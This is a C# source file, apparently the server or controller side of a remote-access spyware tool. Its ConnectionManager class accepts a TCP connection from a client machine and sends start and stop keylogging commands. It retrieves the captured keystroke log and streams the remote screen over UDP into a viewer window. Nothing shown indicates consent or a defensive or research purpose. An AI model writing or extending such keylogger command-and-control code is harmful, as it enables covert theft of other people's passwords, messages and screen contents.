using System;
using System.Configuration;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Media.Imaging;
using Protocol;

namespace Server
{
    public static class ConnectionManager
    {
        public static int fps = 30;

        private static UdpClient _udpClient;
        private static TcpListener _listener;
        private static TcpClient _tcpClient;

        public static InfoWindow InfoWindow;
        public static Screen ScreenWindow;

        public static bool RequestScreen = false;

        private static bool _tcpConnected = false;

        public static bool TcpConnected
        {
            get => _tcpConnected;
            
            set
            {
                if(_tcpConnected == value) return;
                _tcpConnected = value;
                if (_tcpConnected) InfoWindow.SetOnline(InfoWindow.Tcp);
                else
                {
                    InfoWindow.SetOffline(InfoWindow.Tcp);
                    ConnectTcp();
                }
            }
        }

        private static bool _udpConnected = false;

        public static bool UdpConnected
        {
            get => _udpConnected;
            set
            {
                if (_udpConnected == value) return;
                _udpConnected = value;
                if (_udpConnected) InfoWindow.SetOnline(InfoWindow.Udp);
                else
                {
                    InfoWindow.SetOffline(InfoWindow.Udp);
                }
            }
        }

        private static int TcpPort => int.Parse(ConfigurationManager.AppSettings["TCP-PORT"]);
        private static int UdpPort => int.Parse(ConfigurationManager.AppSettings["UDP-PORT"]);

        public static Log ReceiveKeyLog()
        {
            if (_tcpClient != null)
            {
                SendCommand(Commands.RequestKeyLog);
                try
                {
                    Log log = (Log)Transfer.ReceiveTcpBig(_tcpClient);
                    TcpConnected = true;
                    InfoWindow.SetOnline(InfoWindow.KeyLogger);
                    return log;
                }
                catch (Exception e)
                {
                    TcpConnected = false;
                }
            }

            return new Log("<NoConnection>", "");
        }

        public static void ConnectTcp()
        {
            TcpConnected = false;

            if (_listener == null)
            {
                _listener = TcpListener.Create(TcpPort);
                _listener.Start();
            }

            if (_tcpClient != null)
            {
                _tcpClient.Close();
                _tcpClient = null;
            }

            _tcpClient = _listener.AcceptTcpClient();

            TcpConnected = true;
            //UdpConnected = false;
        }
        public static async void ReceiveScreen()
        {
            await Task.Run(() =>
            {
                ConnectTcp();

                _udpClient = new UdpClient(UdpPort);
                while (true)
                {
                    Thread.Sleep(1000 / fps);
                    if (InfoWindow != null)
                    {
                        if (!RequestScreen) InfoWindow.SetOffline(InfoWindow.Screen);
                        else InfoWindow.SetOnline(InfoWindow.Screen);
                    }

                    while (!RequestScreen)
                    {
                        Thread.Sleep(500);
                    }

                    try
                    {
                        if (_tcpClient == null)
                        {
                            ConnectTcp();
                            continue;
                        }
                        Transfer.SendTcp(_tcpClient, new Command(Commands.RequestScreen));
                        TcpConnected = true;
                    }
                    catch (Exception e)
                    {
                        TcpConnected = false;
                        continue;
                    }
                    byte[] bytes = null;
                    try
                    {
                        bytes = Transfer.ReceiveUpdBig(_udpClient);
                        UdpConnected = true;
                        if (bytes == null)
                        {
                            UdpConnected = false;
                            continue;
                        }
                    }
                    catch (Exception e)
                    {
                        UdpConnected = false;
                        Thread.Sleep(1000);
                        continue;
                    }

                    ScreenWindow.Dispatcher.Invoke(() => ScreenWindow.ImageBlock.Source = BytesToImage(bytes));
                }
            });
        }

        public static void SendCommand(Commands command)
        {
            if (_tcpClient != null)
            {
                try
                {
                    Transfer.SendTcp(_tcpClient, new Command(command));
                    if (command == Commands.StartKeyLogging) InfoWindow.SetOnline(InfoWindow.KeyLogger);
                    else if (command == Commands.StopKeyLogging) InfoWindow.SetOffline(InfoWindow.KeyLogger);
                    TcpConnected = true;
                }
                catch (Exception e)
                {
                    TcpConnected = false;
                }
            }
        }
        public static BitmapImage BytesToImage(byte[] bytes)
        {
            try
            {
                using (var stream = new MemoryStream(bytes))
                {
                    var bitmap = new BitmapImage();
                    bitmap.BeginInit();
                    bitmap.StreamSource = stream;
                    bitmap.CacheOption = BitmapCacheOption.OnLoad;
                    bitmap.EndInit();
                    bitmap.Freeze();
                    return bitmap;
                }
            }
            catch (Exception e)
            {
                return new BitmapImage();
            }
        }

        public static void Disconnect()
        {
            if (_tcpClient != null)
                Transfer.SendTcp(_tcpClient, new Command(Commands.Disconnect));
            _tcpClient?.Close();
        }
    }
}